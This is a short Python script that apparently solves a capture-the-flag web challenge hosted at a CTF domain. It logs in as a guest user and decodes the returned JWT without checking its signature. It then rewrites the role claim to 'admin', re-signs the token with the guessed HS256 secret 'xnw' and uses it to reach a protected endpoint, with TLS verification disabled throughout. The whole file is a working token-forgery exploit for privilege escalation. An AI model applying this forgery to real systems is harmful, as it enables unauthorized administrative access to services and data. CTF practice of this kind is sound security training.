import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import jwt

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
url="https://ctf-spcs.mf.grsu.by/task/web_wtf"


# guess:password123
data = {
	"username":"guest",
	"password":"password123"
}

resp = requests.post(url+"/login", json=data, verify=False)
token = resp.json()['token']

decoded_token = jwt.decode(token, options={"verify_signature": False})
print("initial token:",decoded_token)
decoded_token['role'] = 'admin'
print("forged token:",decoded_token)

forged_token = jwt.encode(decoded_token, "xnw", algorithm="HS256")
headers = {
	"Authorization": f"Bearer {forged_token}"
}
resp = requests.get(url+"/protected", headers=headers, verify=False)
print(resp.text)
